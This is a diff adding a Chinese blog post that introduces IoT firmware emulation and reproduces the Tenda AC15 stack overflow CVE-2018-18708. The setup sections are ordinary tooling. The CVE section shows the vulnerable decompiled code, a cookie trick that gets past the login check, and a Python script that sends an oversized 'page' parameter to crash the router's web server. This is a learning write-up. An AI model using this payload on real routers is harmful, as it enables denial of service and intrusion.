@@ -1,0 +1,444 @@
+<!DOCTYPE html>
+<html><head lang="en"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Tenda-cve - ldrx30</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta name="description" content="
+IoT简易入门
+" />
+	<meta property="og:image" content=""/>
+	<meta property="og:title" content="Tenda-cve" />
+<meta property="og:description" content="
+IoT简易入门
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/tenda-cve/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-03-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2024-03-21T00:00:00+00:00" />
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Tenda-cve"/>
+<meta name="twitter:description" content="
+IoT简易入门
+"/>
+<script src="http://localhost:1313/js/feather.min.js"></script>
+	
+	
+        <link href="http://localhost:1313/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css" rel="stylesheet">
+	
+
+	
+	<link rel="stylesheet" type="text/css" media="screen" href="http://localhost:1313/css/main.5cebd7d4fb2b97856af8d32a6def16164fcf7d844e98e236fcb3559655020373.css" />
+		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="http://localhost:1313/css/dark.d22e2a2879d933a4b781535fc4c4c716e9f9d35ea4986dd0cbabda82effc4bdd.css"  disabled />
+	
+
+	
+	
+		<script type="text/javascript"
+		src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+		</script>
+
+		
+		<script type="text/x-mathjax-config">
+		MathJax.Hub.Config({
+			tex2jax: {
+				inlineMath: [['$','$'], ['\\(','\\)']],
+				displayMath: [['$$','$$'], ['\[','\]']],
+				processEscapes: true,
+				processEnvironments: true,
+				skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+				TeX: { equationNumbers: { autoNumber: "AMS" },
+						 extensions: ["AMSmath.js", "AMSsymbols.js"] }
+			}
+		});
+		</script>
+	
+
+	
+	
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css">
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js"></script>
+		<script defer src="https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body);"></script>
+
+		
+		<script>
+			document.addEventListener("DOMContentLoaded", function() {
+					renderMathInElement(document.body, {
+							delimiters: [
+									{left: "$$", right: "$$", display: true},
+									{left: "$", right: "$", display: false}
+							]
+					});
+			});
+			</script>
+	
+
+	
+</head>
+<body>
+        <div class="content"><header>
+	<div class="main">
+		<a href="http://localhost:1313/">ldrx30</a>
+	</div>
+	<nav>
+		
+		<a href="/">Home</a>
+		
+		<a href="/posts">All posts</a>
+		
+		<a href="/about">About</a>
+		
+		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
+		<script src="http://localhost:1313/js/themetoggle.js"></script>
+		
+	</nav>
+</header>
+
+<main>
+	<article>
+		<div class="title">
+			<h1 class="title">Tenda-cve</h1>
+			<div class="meta">Posted on Mar 21, 2024</div>
+		</div>
+		
+
+		
+
+		<section class="body">
+			<blockquote>
+<p>IoT简易入门</p>
+</blockquote>
+<p>复现，有了经验后尝试挖掘</p>
+<h2 id="环境">环境</h2>
+<h3 id="固件解包">固件解包</h3>
+<p><a href="https://github.com/ReFirmLabs/binwalk">binwalk</a>: 可以分析并且解包</p>
+<p>没有加密，因此可以使用binwalk解包</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># -e, --extract                Automatically extract known file types</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># -M, --matryoshka             Recursively scan extracted files</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 也就是递归解包</span>
+</span></span><span style="display:flex;"><span>$ binwalk -Me xxx.bin
+</span></span></code></pre></div><h3 id="仿真">仿真</h3>
+<p>有资金可以买个设备，效果更好。没资金的就虚拟运行</p>
+<p>主要参考：<a href="https://github.com/SecureNexusLab/IoTFirmwareAnalysisGuide/blob/main/GuideTutorial/3-%E5%9B%BA%E4%BB%B6%E4%BB%BF%E7%9C%9F.md">固件仿真</a></p>
+<h4 id="qemu-user">qemu-user</h4>
+<p>下载静态编译的qemu-user，避免某些动态链接库导致运行错误</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt install qemu-user-static
+</span></span></code></pre></div><h4 id="qemu-system">qemu-system</h4>
+<p>QEMU-System是QEMU项目的一部分，它提供了完整的虚拟化和仿真环境，允许用户模拟整个计算机系统，包括CPU、内存、外部设备等。QEMU-System是一种强大的工具，可用于多种用途，包括虚拟化、操作系统开发、嵌入式系统测试和仿真等。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt install qemu-system
+</span></span></code></pre></div><h5 id="搭建网桥">搭建网桥</h5>
+<p>bridge是一个虚拟网络设备，所以具有网络设备的特征，可以配置IP、MAC地址等；其次，bridge是一个虚拟交换机，和物理交换机有类似的功能。</p>
+<p>添加一个虚拟网桥并且获得IP地址</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo apt install uml-utilities bridge-utils net-tools
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 添加一个网桥</span>
+</span></span><span style="display:flex;"><span>$ sudo brctl addbr br0
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># add interface</span>
+</span></span><span style="display:flex;"><span>$ sudo brctl addif br0 eth0
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 网桥 up</span>
+</span></span><span style="display:flex;"><span>$ sudo ifconfig br0 up
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># dhcp 获得IP</span>
+</span></span><span style="display:flex;"><span>$ sudo dhclient br0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 删除网桥</span>
+</span></span><span style="display:flex;"><span>$ sudo ifconfig br0 down         
+</span></span><span style="display:flex;"><span>$ sudo brctl delbr br0
+</span></span></code></pre></div><p>iproute2: <a href="https://linux.cn/article-4326-1.html">iproute2 对决 net-tools</a>，现在大部分linux默认安装这个工具而不是net-tools</p>
+<p>参考 <a href="https://wiki.archlinux.org/title/Network_bridge">ArchWiki</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#6272a4"># 新建一个网桥</span>
+</span></span><span style="display:flex;"><span>$ sudo ip link add name br0 <span style="color:#8be9fd;font-style:italic">type</span> bridge
+</span></span><span style="display:flex;"><span>$ sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> dev br0 up
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 将网卡加入/删除网桥</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 想要添加Interface到网桥上，interface状态必须是Up</span>
+</span></span><span style="display:flex;"><span>$ sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> eth1 master br0
+</span></span><span style="display:flex;"><span>$ sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> eth1 nomaster
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 设置ip地址,需要结合自己的网关等进行设置</span>
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># IP address attached to eth1: 10.2.3.4/8</span>
+</span></span><span style="display:flex;"><span>$ sudo ip address add 10.2.3.4/8 dev br0
+</span></span></code></pre></div><p>tun网卡</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ip tuntap add dev tap0 mod tap <span style="color:#6272a4"># 创建 tap </span>
+</span></span><span style="display:flex;"><span>$ ip tuntap add dev tun0 mod tun <span style="color:#6272a4"># 创建 tun</span>
+</span></span></code></pre></div><h5 id="chroot">chroot</h5>
+<p>首先，可以在<a href="https://people.debian.org/~aurel32/qemu">aurel32/qemu</a>下载qemu-system所需的文件</p>
+<ul>
+<li>kernel: zImage 格式压缩的 linux kernel</li>
+<li>inited: ramdisk 镜像</li>
+<li>drive: 文件系统镜像</li>
+<li>主要是net，设置为我们设置的网桥</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>qemu-system-arm <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-M vexpress-a9 <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-kernel vmlinuz-3.2.0-4-vexpress <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-initrd initrd.img-3.2.0-4-vexpress <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-drive <span style="color:#ff79c6">if</span><span style="color:#ff79c6">=</span>sd,file<span style="color:#ff79c6">=</span>debian_wheezy_armhf_standard.qcow2 <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-append <span style="color:#f1fa8c">&#34;root=/dev/mmcblk0p2 console=ttyAMA0&#34;</span> <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-net nic <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-net tap,ifname<span style="color:#ff79c6">=</span>br0,script<span style="color:#ff79c6">=</span>no,downscript<span style="color:#ff79c6">=</span>no <span style="color:#f1fa8c">\
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span>	-nographic
+</span></span></code></pre></div><h4 id="fat">FAT</h4>
+<p><a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a>: 依赖<a href="https://github.com/firmadyne/firmadyne">firmadyne</a>进行模拟</p>
+<p>安装，会安装binwalk，并且和之前的冲突</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/attify/firmware-analysis-toolkit
+</span></span><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">cd</span> firmware-analysis-toolkit
+</span></span><span style="display:flex;"><span>$ ./setup.sh
+</span></span></code></pre></div><p>使用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./fat.py xxx.bin
+</span></span></code></pre></div><h4 id="unicorn">Unicorn</h4>
+<p>Unicorn 是一个 CPU 模拟器，</p>
+<p><a href="https://github.com/unicorn-engine/unicorn">unicorn: Unicorn CPU emulator framework (ARM, AArch64, M68K, Mips, Sparc, PowerPC, RiscV, S390x, TriCore, X86) </a></p>
+<h4 id="qiling">Qiling</h4>
+<p>qiling由Unicorn引擎支持。</p>
+<p><a href="https://github.com/qilingframework/qiling">qiling: A True Instrumentable Binary Emulation Framework</a></p>
+<p>源码或者docker</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/qilingframework/qiling
+</span></span><span style="display:flex;"><span><span style="color:#6272a4"># 文件系统</span>
+</span></span><span style="display:flex;"><span>$ <span style="color:#8be9fd;font-style:italic">cd</span> qiling <span style="color:#ff79c6">&amp;&amp;</span> git submodule update --init --recursive pip3 install .
+</span></span><span style="display:flex;"><span>$ pip3 install .
+</span></span></code></pre></div><h2 id="编译ghidra">编译ghidra</h2>
+<p>mips反编译下ghidra更好用</p>
+<p>Linux可以使用包管理器下载，windows也可以直接下载release里的内容。</p>
+<p>编译结果在<code>build/dist/</code>，是一个压缩包，这样每次更新就重新编译，不用每次更新下载release了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PS&gt; gradle -I gradle/support/fetchDependencies.gradle init
+</span></span><span style="display:flex;"><span>PS&gt; gradle buildGhidra
+</span></span></code></pre></div><h2 id="获取固件">获取固件</h2>
+<p><a href="https://github.com/re1wn/IoT-fstm/blob/main/IoT-project/%E7%89%A9%E8%81%94%E7%BD%91%E8%AE%BE%E5%A4%87%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97.md">物联网设备固件分析指南</a></p>
+<ol>
+<li>硬件：飞线，拆芯片，uart串口</li>
+<li>网络抓包：更新包时会请求并且下载</li>
+<li>官网：官网提供下载</li>
+<li>伸手党：问认识的大佬要😋</li>
+</ol>
+<h2 id="ida-plugins">IDA plugins</h2>
+<p>历年比较好的IDA插件，改url后面的年份查看：<a href="https://hex-rays.com/contests_details/contest2023/">Plug-In Contest</a></p>
+<p>也可以自己开发</p>
+<h2 id="tenda">tenda</h2>
+<ul>
+<li><a href="https://www.tenda.com.cn/download/default.html">资料下载_腾达官方网站</a></li>
+<li><a href="https://www.tendacn.com/download/default.html">Download_Tenda-All For Better NetWorking</a></li>
+</ul>
+<h3 id="cve-2018-18708">CVE-2018-18708</h3>
+<p>参考文章：<a href="https://blog.xmcve.com/2022/10/08/CVE-2018-18708-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Tenda CVE-2018-18708 漏洞复现</a></p>
+<p>固件: <a href="https://www.tenda.com.cn/download/detail-2680.html">AC15 V15.03.05.19</a></p>
+<p>漏洞存在于bin/httpd：路由器的web服务器——httpd中的一个缓冲区溢出漏洞。 在处理 post 请求的函数<code>fromAddressNat</code>的<code>page</code>参数时，该值直接在 sprintf 中用于放置在堆栈上的局部变量，这会覆盖函数的返回地址。</p>
+<p>直接看反编译代码，<code>entrys</code> <code>mitInterface</code> <code>page</code>三个参数用户可控，page会被sprintf拼接到v6中， 并没有对大小进行检查，导致了栈溢出漏洞</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">fromAddressNat</span>(<span style="color:#8be9fd">int</span> a1)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">int</span> v1; <span style="color:#6272a4">// r0
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v4[<span style="color:#bd93f9">256</span>]; <span style="color:#6272a4">// [sp+14h] [bp-418h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> s[<span style="color:#bd93f9">512</span>]; <span style="color:#6272a4">// [sp+114h] [bp-318h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#8be9fd">char</span> v6[<span style="color:#bd93f9">256</span>]; <span style="color:#6272a4">// [sp+314h] [bp-118h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>v7; <span style="color:#6272a4">// [sp+414h] [bp-18h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>v8; <span style="color:#6272a4">// [sp+418h] [bp-14h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  <span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>v9; <span style="color:#6272a4">// [sp+41Ch] [bp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>  memset(v4, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">sizeof</span>(v4));
+</span></span><span style="display:flex;"><span>  v9 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)sub_2BA8C(a1, <span style="color:#f1fa8c">&#34;entrys&#34;</span>, <span style="color:#ff79c6">&amp;</span>unk_E5D48);
+</span></span><span style="display:flex;"><span>  v8 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)sub_2BA8C(a1, <span style="color:#f1fa8c">&#34;mitInterface&#34;</span>, <span style="color:#ff79c6">&amp;</span>unk_E5D48);
+</span></span><span style="display:flex;"><span>  sprintf(s, <span style="color:#f1fa8c">&#34;%s;%s&#34;</span>, v9, v8);
+</span></span><span style="display:flex;"><span>  sub_4EC58(<span style="color:#f1fa8c">&#34;adv.addrnat&#34;</span>, s, <span style="color:#bd93f9">126</span>);
+</span></span><span style="display:flex;"><span>  v7 <span style="color:#ff79c6">=</span> (<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)sub_2BA8C(a1, <span style="color:#f1fa8c">&#34;page&#34;</span>, <span style="color:#f1fa8c">&#34;1&#34;</span>);
+</span></span><span style="display:flex;"><span>  v1 <span style="color:#ff79c6">=</span> sprintf(v6, <span style="color:#f1fa8c">&#34;advance/addressNatList.asp?page=%s&#34;</span>, v7);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( CommitCfm(v1) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    sprintf(v4, <span style="color:#f1fa8c">&#34;advance_type=%d&#34;</span>, <span style="color:#bd93f9">7</span>);
+</span></span><span style="display:flex;"><span>    send_msg_to_netctrl(<span style="color:#bd93f9">5</span>, v4);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> sub_2BE4C(a1, v6);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>交叉引用寻找到，推测是注册路由的地方，我们可以从这入手挖洞</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">sub_42378</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">// ...
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  sub_171EC(<span style="color:#f1fa8c">&#34;GetStaticRouteCfg&#34;</span>, formGetRouteStatic);
+</span></span><span style="display:flex;"><span>  sub_171EC(<span style="color:#f1fa8c">&#34;SetStaticRouteCfg&#34;</span>, fromSetRouteStatic);
+</span></span><span style="display:flex;"><span>  sub_171EC(<span style="color:#f1fa8c">&#34;addressNat&#34;</span>, fromAddressNat);
+</span></span><span style="display:flex;"><span>  sub_10120(<span style="color:#f1fa8c">&#34;mNatGetStatic&#34;</span>, mNatGetStatic);
+</span></span><span style="display:flex;"><span>  <span style="color:#6272a4">//...
+</span></span></span></code></pre></div><p>然后运行http服务。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>$ cp $(which qemu<span style="color:#ff79c6">-</span>arm<span style="color:#ff79c6">-</span><span style="color:#ff79c6">static</span>) .
+</span></span><span style="display:flex;"><span>$ sudo chroot . .<span style="color:#ff79c6">/</span>qemu<span style="color:#ff79c6">-</span>arm<span style="color:#ff79c6">-</span><span style="color:#ff79c6">static</span> bin<span style="color:#ff79c6">/</span>httpd
+</span></span></code></pre></div><p>然后对着参考文章进行patch，或者配置网桥</p>
+<p>配置网桥，至于网桥名称为什么是br0：<a href="https://blog.csdn.net/song_lee/article/details/113800058">Tenda AC15 路由器漏洞分析与复现</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ip link add br0 <span style="color:#8be9fd;font-style:italic">type</span> bridge
+</span></span><span style="display:flex;"><span>sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> eth0 br0 master
+</span></span><span style="display:flex;"><span>sudo ip link <span style="color:#8be9fd;font-style:italic">set</span> br0 up
+</span></span><span style="display:flex;"><span>sudo ip addr add dev br0 192.168.85.200/24 
+</span></span></code></pre></div><p>cfm fail: patch一下</p>
+<ul>
+<li>问题解决：<a href="https://blog.csdn.net/FigBB/article/details/134856961">ida pro使用Apply patches to保存修改时提示patching canceled..解决方法</a></li>
+</ul>
+<p>Cookie: password=是必要的，后面的值可以随便填</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>GET /main.html HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: 192.168.85.131
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: 1
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.112 Safari/537.36
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+</span></span><span style="display:flex;"><span>Cookie: password=hamster
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate, br
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.9
+</span></span><span style="display:flex;"><span>Connection: 
+</span></span></code></pre></div><p>使用给出PoC导致segment fault，将IP改了，其余不重要</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ff79c6">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>li <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">lambda</span> x : <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x1b</span><span style="color:#f1fa8c">[01;38;5;214m&#39;</span> <span style="color:#ff79c6">+</span> x <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x1b</span><span style="color:#f1fa8c">[0m&#39;</span>)
+</span></span><span style="display:flex;"><span>ll <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">lambda</span> x : <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x1b</span><span style="color:#f1fa8c">[01;38;5;1m&#39;</span> <span style="color:#ff79c6">+</span> x <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\x1b</span><span style="color:#f1fa8c">[0m&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ip <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;192.168.85.131&#39;</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#ff79c6">=</span> socket<span style="color:#ff79c6">.</span>socket(socket<span style="color:#ff79c6">.</span>AF_INET, socket<span style="color:#ff79c6">.</span>SOCK_STREAM)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>li(<span style="color:#f1fa8c">&#39;[+] connecting&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#ff79c6">.</span>connect((ip, port))
+</span></span><span style="display:flex;"><span>li(<span style="color:#f1fa8c">&#39;[+] connect finish&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rn <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\r\n</span><span style="color:#f1fa8c">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p1 <span style="color:#ff79c6">=</span> cyclic(<span style="color:#bd93f9">0x300</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p2 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;page=&#39;</span> <span style="color:#ff79c6">+</span> p1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;POST /goform/addressNat&#34;</span> <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34; HTTP/1.1&#34;</span> <span style="color:#ff79c6">+</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Host: 192.168.0.1&#34;</span> <span style="color:#ff79c6">+</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0&#34;</span> <span style="color:#ff79c6">+</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#34;</span> <span style="color:#ff79c6">+</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Accept-Language: en-US,en;q=0.5&#34;</span> <span style="color:#ff79c6">+</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Accept-Encoding: gzip, deflate&#34;</span> <span style="color:#ff79c6">+</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Cookie: password=hamster&#34;</span> <span style="color:#ff79c6">+</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Connection: close&#34;</span> <span style="color:#ff79c6">+</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Upgrade-Insecure-Requests: 1&#34;</span> <span style="color:#ff79c6">+</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> (<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Content-Length: </span><span style="color:#f1fa8c">%d</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">%</span> <span style="color:#8be9fd;font-style:italic">len</span>(p2)) <span style="color:#ff79c6">+</span>rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span><span style="color:#ff79c6">+</span>rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> rn
+</span></span><span style="display:flex;"><span>p3 <span style="color:#ff79c6">+=</span> p2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>li(<span style="color:#f1fa8c">&#39;[+] sendling payload&#39;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#ff79c6">.</span>send(p3)
+</span></span><span style="display:flex;"><span>
